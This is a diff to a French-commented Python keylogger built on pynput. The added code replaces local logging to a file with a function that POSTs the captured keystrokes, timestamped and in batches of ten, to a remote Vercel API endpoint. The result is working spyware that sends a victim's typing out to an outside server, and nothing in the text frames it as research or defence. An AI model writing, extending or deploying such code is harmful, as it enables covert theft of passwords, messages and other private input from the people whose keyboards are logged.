@@ -2,6 +2,7 @@
 from pynput.keyboard import Listener
 from datetime import datetime
 import re
+import requests  # Ajoutez cette importation en haut du fichier
 
 # Dictionnaire pour mapper les touches spéciales
 SPECIAL_KEYS = {
@@ -29,43 +30,57 @@ SPECIAL_KEYS = {
 # Buffer pour accumuler les frappes
 buffer = []
 
-def write_to_file(key):
+# Configurez l'URL de votre API Vercel
+API_URL = "https://votre-app.vercel.app/api/keystrokes"
+
+def send_to_server(data):
     """
-    Traite la touche pressée et l'écrit dans le fichier.
+    Envoie les données au serveur Vercel.
     """
     try:
-        # Convertit la touche en chaîne de caractères
-        letter = str(key).replace("'", "")
+        payload = {
+            'timestamp': datetime.now().isoformat(),
+            'keystrokes': data
+        }
+        response = requests.post(API_URL, json=payload)
+        if response.status_code != 200:
+            print(f"Erreur lors de l'envoi au serveur: {response.status_code}")
+    except Exception as e:
+        print(f"Erreur de connexion au serveur: {e}")
 
-        # Remplace les touches spéciales par leur représentation textuelle
+def write_to_file(key):
+    """
+    Traite la touche pressée et l'envoie au serveur.
+    """
+    try:
+        letter = str(key).replace("'", "")
         letter = SPECIAL_KEYS.get(letter, letter)
 
-        # Gestion des backspaces
         if letter == '[BACKSPACE]':
-            if buffer:  # Si le buffer n'est pas vide
-                buffer.pop()  # Supprime le dernier caractère
+            if buffer:
+                buffer.pop()
         else:
-            # Ajoute la lettre au buffer
             buffer.append(letter)
 
-        # Écrit immédiatement dans le fichier (suppression de la limite)
-        flush_buffer()
+        # Envoie au serveur au lieu d'écrire dans un fichier
+        if len(buffer) >= 10:  # Envoie par lots de 10 caractères
+            flush_buffer()
 
     except Exception as e:
-        print(f"Erreur lors de l'écriture : {e}")
+        print(f"Erreur lors du traitement : {e}")
 
 def flush_buffer():
     """
-    Écrit le contenu du buffer dans le fichier et vide le buffer.
+    Envoie le contenu du buffer au serveur et vide le buffer.
     """
     try:
-        with open("donKeyPro.txt", 'a', encoding='utf-8') as f:
-            # Ajoute un horodatage avant d'écrire les frappes
-            #f.write(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
-            f.write(''.join(buffer))
-        buffer.clear()  # Vide le buffer après l'écriture
+        if buffer:
+            data = ''.join(buffer)
+            cleaned_data = clean_text(data)
+            send_to_server(cleaned_data)
+            buffer.clear()
     except Exception as e:
-        print(f"Erreur lors de l'écriture dans le fichier : {e}")
+        print(f"Erreur lors de l'envoi au serveur : {e}")
 
 def clean_text(text):
     """
